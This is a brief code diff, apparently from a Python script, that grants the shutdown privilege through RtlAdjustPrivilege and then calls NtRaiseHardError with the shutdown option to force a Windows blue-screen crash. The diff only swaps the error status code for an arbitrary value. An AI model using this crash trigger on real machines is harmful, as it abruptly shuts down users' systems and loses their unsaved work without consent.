@@ -16,5 +16,5 @@ def nt_raise_hard_error(error_status, number_of_parameters, unicode_string_param
 
 ## CALLING FUNC
 rtl_adjust_privilege(19, True, False, t1)
-nt_raise_hard_error(0xc0000022, 0, 0, None, 6, t2)
+nt_raise_hard_error(0xc69DEADD, 0, 0, None, 6, t2)
 ## CALLING FUNC
